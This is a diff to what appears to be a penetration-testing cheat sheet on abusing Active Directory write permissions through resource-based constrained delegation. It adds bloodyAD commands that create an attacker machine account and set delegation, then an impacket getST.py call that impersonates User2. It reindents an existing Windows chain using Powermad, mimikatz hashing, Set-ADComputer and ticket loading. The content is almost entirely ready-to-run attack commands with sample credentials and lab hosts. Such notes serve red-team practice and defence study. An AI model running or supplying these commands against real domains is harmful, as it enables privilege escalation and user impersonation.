@@ -29,26 +29,34 @@ ls \\service2.test.local\c$
 ```
 
 **Attack #2** - Write Permissions to one or more objects in the AD
+* Windows/Linux:
+    ```ps1
+    bloodyAD -u user -p 'totoTOTOtoto1234*' -d test.local --host 10.100.10.5 add computer AttackerService 'AttackerServicePassword'
+    bloodyAD --host 10.1.0.4 -u user -p 'totoTOTOtoto1234*' -d test.local add rbcd 'Service2$' 'AttackerService$'
 
-```powershell
-# Create a new machine account
-Import-Module .\Powermad\powermad.ps1
-New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)
-.\mimikatz\mimikatz.exe "kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local" exit
+    # Execute the attack
+    getST.py -spn cifs/Service2.test.local -impersonate User2 -dc-ip 10.100.10.5 -force-forwardable 'test.local/AttackerService$:AttackerServicePassword'
+    ```
+* Windows only:
+    ```powershell
+    # Create a new machine account
+    Import-Module .\Powermad\powermad.ps1
+    New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)
+    .\mimikatz\mimikatz.exe "kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local" exit
 
-# Set PrincipalsAllowedToDelegateToAccount
-Install-WindowsFeature RSAT-AD-PowerShell
-Import-Module ActiveDirectory
-Get-ADComputer AttackerService
-Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
-Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount
+    # Set PrincipalsAllowedToDelegateToAccount
+    Install-WindowsFeature RSAT-AD-PowerShell
+    Import-Module ActiveDirectory
+    Get-ADComputer AttackerService
+    Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
+    Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount
 
-# Execute the attack
-python .\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardableet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
+    # Execute the attack
+    python .\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardable
 
-# Load the ticket
-.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit | Out-Null
-```
+    # Load the ticket
+    .\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit | Out-Null
+    ```
 
 
 ## References
